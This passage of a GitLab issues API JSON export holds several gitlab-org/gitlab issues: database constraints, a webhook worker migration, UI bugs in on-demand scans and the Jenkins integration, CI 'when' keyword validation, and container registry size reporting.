Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"},"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347405","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":27},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"27 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347405","notes":"https://gitlab.com/api/v4/projects/278964/issues/347405/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347405/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347405","relative":"#347405","full":"gitlab-org/gitlab#347405"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98652134,"iid":347400,"project_id":278964,"title":"Add namespace_id DB constraints","description":"When migration of routes is finished and when project namespace is backfilled for each project, we can:\n* add \"not null\" constraint for routes namespace_id column\n* change `add_concurrent_foreign_key :routes, :namespaces, column: :namespace_id, on_delete: :nullify` to `add_concurrent_foreign_key :routes, :namespaces, column: :namespace_id, on_delete: :cascade`\n\nIt's not safe to do this until there is a chance that project namespaces are deleted (e.g. during backfilling process).\n\n----\n\n### Availability and Testing \n- Please run `package-and-qa` job for MR to ensure no regressions occur. Some areas to keep an eye on for errors would be during resource fabrication (when creating groups and projects), as well as in any after hooks for errors on resource deletion (deleting groups and projects).","state":"closed","created_at":"2021-12-08T08:22:36.893Z","updated_at":"2022-06-21T12:02:38.069Z","closed_at":"2022-06-20T11:01:59.659Z","closed_by":{"id":3483274,"username":"acroitor","name":"Alexandru Croitor","state":"active","avatar_url":"https://secure.gravatar.com/avatar/461378ef52c26eec55e6c15ec09bb9ed?s=80\u0026d=identicon","web_url":"https://gitlab.com/acroitor"},"labels":["Deliverable","auto updated","devops::manage","group::organization","missed-deliverable","missed:15.0","namespace","quad-planning::complete-action","section::dev","workflow::in dev"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":3483274,"username":"acroitor","name":"Alexandru Croitor","state":"active","avatar_url":"https://secure.gravatar.com/avatar/461378ef52c26eec55e6c15ec09bb9ed?s=80\u0026d=identicon","web_url":"https://gitlab.com/acroitor"}],"author":{"id":1642716,"username":"jprovaznik","name":"Jan Provaznik","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4577c0b60b7640100030d7ab267aba95?s=80\u0026d=identicon","web_url":"https://gitlab.com/jprovaznik"},"type":"ISSUE","assignee":{"id":3483274,"username":"acroitor","name":"Alexandru Croitor","state":"active","avatar_url":"https://secure.gravatar.com/avatar/461378ef52c26eec55e6c15ec09bb9ed?s=80\u0026d=identicon","web_url":"https://gitlab.com/acroitor"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347400","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347400","notes":"https://gitlab.com/api/v4/projects/278964/issues/347400/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347400/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347400","relative":"#347400","full":"gitlab-org/gitlab#347400"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7184,"epic":{"id":392209,"iid":7184,"title":"Consolidate Group and Project routing","url":"/groups/gitlab-org/-/epics/7184","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98635479,"iid":347389,"project_id":278964,"title":"Migrate `WebHookWorker` to use `params` hash args: Recursion UUID","description":"This issue came from this discussion: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75821#note_752958083.\n\nWorkers with [parameter hash](https://docs.gitlab.com/ee/development/sidekiq/compatibility_across_updates.html#parameter-hash) args make it much easier to [add new arguments](https://docs.gitlab.com/ee/development/sidekiq_style_guide.html#add-an-argument) to workers.\n\nWe would like to migrate the new webhook detection data being passed through to the worker in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75821 through the existing `data` payload to be migrated to being passed through the new `params` hash instead. \n\nWe will follow a [multi-step deployment](https://docs.gitlab.com/ee/development/sidekiq/compatibility_across_updates.html#multi-step-deployment):\n\n- [x] `Release 14.7`: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75821 is adding a `params = {}` argument to `WebHookWorker`.\n- [x] `Release M+1`: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/79173 Pass the webhook recursion detection data through in `params`, but the worker should continue to expect the data to come through either `data` or `params`.\n- [x] `Release M+2`: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81772 Remove the handling of the recursion detection data in `data`.\n\nNote a separate issue https://gitlab.com/gitlab-org/gitlab/-/issues/351272 captures the migration of more arguments to the `params` arg.\n\n### Availability \u0026 Testing\n\n* `specs/workers/webhook_worker_spec.rb` might be updated to reflect the updated api\n* The recursion detection MR included tests in the unit layer :100:, which should continue to pass or might be updated to reflect the updated api\n* @sgregory2 can also add a feature level test for recursion detection as well, if we feel that we are missing functional coverage\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e","state":"closed","created_at":"2021-12-08T02:20:32.002Z","updated_at":"2022-11-22T19:10:45.931Z","closed_at":"2022-03-02T00:53:59.179Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["Deliverable","backend","devops::manage","group::integrations","maintenance::refactor","quad-planning::complete-action","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"}],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347389","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347389","notes":"https://gitlab.com/api/v4/projects/278964/issues/347389/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347389/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347389","relative":"#347389","full":"gitlab-org/gitlab#347389"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98631161,"iid":347381,"project_id":278964,"title":"On-demand scan page never completes loading","description":"### Problem\nThe on-demand scan page does not complete loading.\n\nSample page:\nhttps://gitlab.com/sethgitlab/ondemand/-/on_demand_scans#/all\n\n![image](/uploads/6bc233dff0cf5148593187068701fddc/image.png)","state":"closed","created_at":"2021-12-07T23:04:10.170Z","updated_at":"2021-12-08T19:27:29.657Z","closed_at":"2021-12-08T19:27:29.644Z","closed_by":{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"},"labels":["Category:DAST","devops::secure","frontend","group::dynamic analysis","section::sec","type::bug","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"}],"author":{"id":4310743,"username":"sethgitlab","name":"Seth Berger","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4310743/avatar.png","web_url":"https://gitlab.com/sethgitlab"},"type":"ISSUE","assignee":{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347381","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347381","notes":"https://gitlab.com/api/v4/projects/278964/issues/347381/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347381/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347381","relative":"#347381","full":"gitlab-org/gitlab#347381"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98623187,"iid":347357,"project_id":278964,"title":"Service Integration View Details Button Does not Work (specifically Jenkins)","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nWhen sending test payloads through the Jenkins Integration in GitLab, the \"View Details\" provides no additional detail into the test request payload.\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n1. Head to https://requestbin.com/r/ and copy the generated endpoint.\n1. In a GitLab Project, head to Settings \u003e Integrations \u003e Jenkins\n1. Supply the URL from RequestBin and a random test name, username, password.\n1. click Save and Test Settings\n1. Hover over the View details button and you'll see the web address it takes you to is the address of the page you're on right now.\n\n\u003e ![Screen_Shot_2021-12-07_at_12.51.00_PM](/uploads/d28d14de1033159f86baf0d8f2938516/Screen_Shot_2021-12-07_at_12.51.00_PM.png)\n\n**URL is incorrect**.\n\n\u003e ![Screen_Shot_2021-12-07_at_12.51.45_PM](/uploads/9b2840bf9bc16276f66ef15628cbcbfa/Screen_Shot_2021-12-07_at_12.51.45_PM.png)\n\nIf you can correctly _guess_ the ID of the Service Hook Log, you can navigate to the page via:\n\n`https://gitlab.com/namespace/proj/-/services/jenkins/hook_logs/550`\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\nThe web address that is provided is not functioning appropriately for View details.\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\nThe View details ought to send you to a page very similar to what the Webhooks `View details` page provides.\n\n\u003e ![Screen_Shot_2021-12-07_at_12.53.27_PM](/uploads/131fcd2981ff4097ed985c024e76bc3b/Screen_Shot_2021-12-07_at_12.53.27_PM.png)\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e\n\nPotential Culprits: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/71792 or https://gitlab.com/gitlab-org/gitlab/-/merge_requests/71788/diffs\n\n\nSomething I think is wrong in the rendering of the HAML.\n\nNot Working: https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/projects/services/edit.html.haml\n\nWorking: https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/projects/hooks/edit.html.haml\n\nBoth leverage: [_index](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/projects/hook_logs/_index.html.haml) \u003e [_recent_deliveries_table](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/shared/hook_logs/_recent_deliveries_table.html.haml) \u003e [hooks_helper](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/helpers/hooks_helper.rb#L40-48)","state":"closed","created_at":"2021-12-07T18:54:34.332Z","updated_at":"2022-11-22T19:10:50.231Z","closed_at":"2022-01-12T06:35:22.752Z","closed_by":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"labels":["Category:Integrations","Integration::Jenkins","backend","customer","devops::manage","group::integrations","section::dev","type::bug","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"}],"author":{"id":428430,"username":"poffey21","name":"Tim Poffenbarger","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/428430/avatar.png","web_url":"https://gitlab.com/poffey21"},"type":"ISSUE","assignee":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"user_notes_count":7,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347357","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347357","notes":"https://gitlab.com/api/v4/projects/278964/issues/347357/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347357/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347357","relative":"#347357","full":"gitlab-org/gitlab#347357"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98622288,"iid":347356,"project_id":278964,"title":"Backend: Prevent When keyword from being defined as an array","description":"### Summary\n\nWhen using then `When` keyword as an array, it will leave the job in a skipped state, giving the impression that it is supposed to work when in reality, `When` keywords should never be allowed to be used as arrays.\n\n![Screen_Shot_2021-12-07_at_12.12.21_PM](/uploads/9b4d34cb44c5f69cb43431551d43306d/Screen_Shot_2021-12-07_at_12.12.21_PM.png)\n\n### Steps to reproduce\n\n1. Add the following pipeline definition in any CI/CD enabled project\n\n\u003cdetails\u003e\u003csummary\u003eClick to expand `gitlab-ci.yml`\u003c/summary\u003e\n\n\n```yaml\nimage: alpine\n\ntest:\n  stage: test\n  script: exit 0\n\nwhen-is-a-string:\n  stage: deploy\n  script: exit 0\n  when: manual\n\nwhen-is-an-array:\n  stage: deploy\n  script: exit 0\n  when:\n    - manual\n```\n\n:rotating_light: **NOTE:** This behavior only occurs when defining the `When` keyword as an array.  When defining as a string, it can be clicked in the UI to trigger the job.\n\n\n\u003c/details\u003e\n\n2. Visit the created pipeline\n3. Await completion of \"test\" stage job\n4. Notice that when \"test\" stage job completes, `when-is-an-array` can't be run at all and `when-is-a-string` can be.\n\n### Example project\n\nhttps://gitlab.com/marknuzzo/labs/-/pipelines/424594910\n\n### What is the current *bug* behavior?\n\nThe job called `when-is-an-array` is shown, giving the impression that it could work like `when-is-a-string`, but is not clickable.\n\n### What is the expected *correct* behavior?\n\nWe should not allow a `When` keyword to be an array at all as it should only be a string.\n\n### Workarounds\n\nUsers need to manually change `When` keyword to a string but it should not be allowed to be an array initially.\n\n### Output of checks\n\nThis bug happens on GitLab.com","state":"closed","created_at":"2021-12-07T18:27:04.466Z","updated_at":"2022-10-28T15:27:04.915Z","closed_at":"2022-10-20T12:02:18.435Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Category:Pipeline Authoring","approaching-SLO","backend","candidate::15.6","customer","devops::verify","group::pipeline authoring","missed-SLO","priority::3","section::ops","severity::2","type::bug","workflow::production"],"milestone":{"id":2687593,"iid":81,"group_id":9970,"title":"15.6","description":"","state":"active","created_at":"2022-07-06T19:22:27.893Z","updated_at":"2022-07-06T19:22:27.893Z","due_date":"2022-11-17","start_date":"2022-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/81"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":9468400,"username":"marknuzzo","name":"Mark Nuzzo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9468400/avatar.png","web_url":"https://gitlab.com/marknuzzo"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":23,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347356","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347356","notes":"https://gitlab.com/api/v4/projects/278964/issues/347356/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347356/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347356","relative":"#347356","full":"gitlab-org/gitlab#347356"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":72239,"iid":86,"sequence":27,"group_id":9970,"title":null,"description":null,"state":3,"created_at":"2022-07-25T00:05:01.895Z","updated_at":"2022-10-31T00:05:02.250Z","start_date":"2022-10-17","due_date":"2022-10-30","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/72239"},"health_status":"on_track"},{"id":98621665,"iid":347351,"project_id":278964,"title":"Expose deduplicated size of grouped image repositories through the API","description":"## Context\n\nWe are rolling out a new version of the Container Registry in GitLab.com that includes a metadata database (\u0026amp;5523). Among others, this database will allow for efficient storage usage calculations.\n\nThis issue is part of a work plan to expose the deduplicated size of **grouped** image repositories in the GitLab UI and API (https://gitlab.com/groups/gitlab-org/-/epics/7228).\n\nWhat is the deduplicated size of grouped image repositories? Say we have a `my-group/my-project` container repository. Project level container repositories can have up to three sub-levels of container repositories. For example, let's consider we have `my-group/my-project/foo` and `my-group/my-project/bar` as well. In this case, if we want to know the deduplicated size of all repositories under a given project, we have to query the container registry for the deduplicated size of `my-group/my-project` and its descendants (if any).\n\nThe Container Registry has a new API under the `/gitlab/v1/` prefix, documented [here](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md). This API includes a [Get repository details](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md#get-repository-details) operation which allows retrieving details about image repositories, including their deduplicated size. To make this possible, the `size` query parameter of this operation must be set to `self_with_descendants` instead of `self`.\n\n## Proposal\n\nOnce the Container Registry API is updated to allow querying the size of grouped repositories (https://gitlab.com/gitlab-org/container-registry/-/issues/519), we should:\n\n1. Add support for obtaining the size of grouped image repositories to the Rails container registry client class, using the [get repository details](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md#get-repository-details) operation of the new Container Registry API. https://gitlab.com/gitlab-org/gitlab/-/issues/353555 must be done first.\n\n   By the time we start working on this, support for this registry operation and the `size` parameter was already added as part of https://gitlab.com/gitlab-org/gitlab/-/issues/347349. Therefore, in this issue, all we'll have to do is add support for the `self_with_descendants` option of the `size` query parameter.\n\n1. Expose the size of grouped image repositories in the response of the GitLab API [Get details of a single repository](https://docs.gitlab.com/ee/api/container_registry.html#get-details-of-a-single-repository) operation.\n\n   For the time being, this will require making an HTTP request against the new Container Registry API for each image repository. Therefore, we should start small and only add support for this to the [Get details of a single repository](https://docs.gitlab.com/ee/api/container_registry.html#get-details-of-a-single-repository) operation, leaving the [List registry repositories](https://docs.gitlab.com/ee/api/container_registry.html#list-registry-repositories) operation for later. Additionally, we should guard this new behavior behind an optional query parameter `descendants` (boolean), which should be paired with `size`:\n\n   ```shell\n   curl --header \"PRIVATE-TOKEN: \u003cyour_access_token\u003e\" \\\n     \"https://gitlab.example.com/api/v4/registry/repositories/2?size=true\u0026descendants=true\"\n   ```\n\n   We should then fill the `size` response attribute with the size returned from the registry (in `size_bytes`).\n\n### Important Notes\n\n- Please note that for now, this operation will only be available for GitLab.com and for image repositories created on (or imported into) the new container registry platform backed by the metadata database. The Container Registry API will reply with a `404 Not Found` in case the **base** repository does not exist on the new platform. To avoid making unnecessary HTTP requests just to find out that the information is not available, in Rails we should restrict this operation to be used only when `Gitlab.com?` is `true` and the **base** container repository was created after `ContainerRepository::MIGRATION_PHASE_1_ENDED_AT` (which should be set to `2022-01-22`).\n\n- When querying for the aggregated size of `my-group/my-project` (base repository), it's possible that `my-group/my-project/foo` is on the new platform but `my-group/my-project/bar` is not. In this case, the returned size will be incomplete. There are two ways we can proceed in regards to this:\n\n     1. Restrict this operation to base repositories whose sub repositories were all created after `ContainerRepository::MIGRATION_PHASE_1_ENDED_AT`. This guarantees that the returned size is accurate and complete, as all repositories live in the new platform;\n     1. Expand the evaluation conditions to take into account the migration status of repositories created before `ContainerRepository::MIGRATION_PHASE_1_ENDED_AT`.","state":"closed","created_at":"2021-12-07T18:11:23.392Z","updated_at":"2022-04-18T07:02:25.898Z","closed_at":"2022-04-12T21:20:47.499Z","closed_by":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"labels":["Category:Container Registry","Deliverable","Package:P1","UX","auto updated","backend","devops::package","feature::addition","group::package registry","package:active","ruby","section::ops","type::feature","workflow::in dev"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":5054840,"username":"jdrpereira","name":"Joo Pereira","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054840/avatar.png","web_url":"https://gitlab.com/jdrpereira"},"type":"ISSUE","assignee":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"user_notes_count":41,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347351","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347351","notes":"https://gitlab.com/api/v4/projects/278964/issues/347351/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347351/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347351","relative":"#347351","full":"gitlab-org/gitlab#347351"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7228,"epic":{"id":401185,"iid":7228,"title":"Project-level storage usage visibility for the Container Registry","url":"/groups/gitlab-org/-/epics/7228","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"at_risk"},{"id":98621458,"iid":347350,"project_id":278964,"title":"Surface deduplicated size of individual image repositories in the UI","description":"## Context\n\nWe are rolling out a new version of the Container Registry in GitLab.com that includes a metadata database (\u0026amp;5523). Among others, this database will allow for efficient storage usage calculations.\n\nThis issue is part of a work plan to expose the deduplicated size of individual image repositories in the GitLab UI and API (https://gitlab.com/groups/gitlab-org/-/epics/7575).\n\nThe Container Registry has a new API under the `/gitlab/v1/` prefix, documented [here](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md). This API includes a [Get repository details](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md#get-repository-details) operation, which allows retrieving details about image repositories, including their deduplicated size.\n\n## Proposal\n\nLeveraging on https://gitlab.com/gitlab-org/gitlab/-/issues/347349, surface the size of individual image repositories in the GitLab UI.\n\nFor now, and as described in https://gitlab.com/gitlab-org/gitlab/-/issues/347349, obtaining the size of image repositories requires an HTTP request against the Container Registry API. Therefore, let's start small and only display the size information when seeing the details of 